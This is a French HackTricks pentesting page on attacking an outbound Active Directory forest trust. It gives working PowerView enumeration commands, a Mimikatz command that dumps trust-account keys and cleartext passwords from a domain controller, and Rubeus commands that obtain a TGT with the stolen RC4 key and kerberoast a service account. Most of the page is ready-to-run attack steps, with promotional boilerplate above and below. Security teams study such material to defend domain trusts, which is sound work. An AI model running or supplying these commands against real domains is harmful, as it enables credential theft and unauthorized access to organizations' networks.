# Domaine Forestier Externe - Unidirectionnel (Sortant)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Dans ce scénario, **votre domaine** accorde une **confiance** à certains **privilèges** à un principal provenant de **différents domaines**.

## Énumération

### Confiance Sortante
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Attaque du compte de confiance

Lorsqu'une confiance de domaine ou de forêt Active Directory est établie à partir d'un domaine _B_ vers un domaine _A_ (_**B**_ fait confiance à A), un compte de confiance est créé dans le domaine **A**, nommé **B. Kerberos trust keys**. Les clés de confiance Kerberos, dérivées du **mot de passe du compte de confiance**, sont utilisées pour **chiffrer les TGT inter-réalmes**, lorsque les utilisateurs du domaine A demandent des tickets de service pour des services dans le domaine B.

Il est possible d'obtenir le mot de passe et le hash du compte de confiance à partir d'un contrôleur de domaine en utilisant :
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Le risque est dû au fait que le compte de confiance B$ est activé, que le groupe principal de B$ est Domain Users du domaine A, que toute autorisation accordée à Domain Users s'applique à B$ et qu'il est possible d'utiliser les informations d'identification de B$ pour s'authentifier sur le domaine A.

{% hint style="warning" %}
Par conséquent, à partir du domaine de confiance, il est possible d'obtenir un utilisateur à l'intérieur du domaine de confiance. Cet utilisateur n'aura pas beaucoup de permissions (probablement seulement Domain Users), mais vous pourrez énumérer le domaine externe.
{% endhint %}

Dans cet exemple, le domaine de confiance est `ext.local` et celui de confiance est `root.local`. Par conséquent, un utilisateur appelé `EXT$` est créé à l'intérieur de `root.local`.
```bash
# Use mimikatz to dump trusted keys
lsadump::trust /patch
# You can see in the output the old and current credentials
# You will find clear text, AES and RC4 hashes
```
Par conséquent, à ce stade, nous avons le **mot de passe en clair actuel de `root.local\EXT$` et la clé secrète Kerberos**. Les clés secrètes AES Kerberos de **`root.local\EXT$`** sont identiques aux clés de confiance AES car un sel différent est utilisé, mais les clés RC4 sont les mêmes. Par conséquent, nous pouvons **utiliser la clé de confiance RC4** extraite de ext.local pour nous **authentifier** en tant que `root.local\EXT$` contre `root.local`.
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Avec cela, vous pouvez commencer à énumérer ce domaine et même à récupérer les tickets Kerberos des utilisateurs :
```
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Obtenir le mot de passe de confiance en clair

Dans le flux précédent, le hash de confiance a été utilisé au lieu du **mot de passe en clair** (qui a également été **dumpé par mimikatz**).

Le mot de passe en clair peut être obtenu en convertissant la sortie \[ CLEAR ] de mimikatz de l'hexadécimal et en supprimant les octets nuls '\x00':

![](<../../.gitbook/assets/image (2) (1) (2).png>)

Parfois, lors de la création d'une relation de confiance, un mot de passe doit être saisi par l'utilisateur pour la confiance. Dans cette démonstration, la clé est le mot de passe de confiance d'origine et donc lisible par l'homme. Comme la clé change (tous les 30 jours), le texte en clair ne sera pas lisible par l'homme mais techniquement toujours utilisable.

Le mot de passe en clair peut être utilisé pour effectuer une authentification régulière en tant que compte de confiance, une alternative à la demande d'un TGT en utilisant la clé secrète Kerberos du compte de confiance. Ici, la requête de root.local à ext.local pour les membres de Domain Admins:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## Références

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
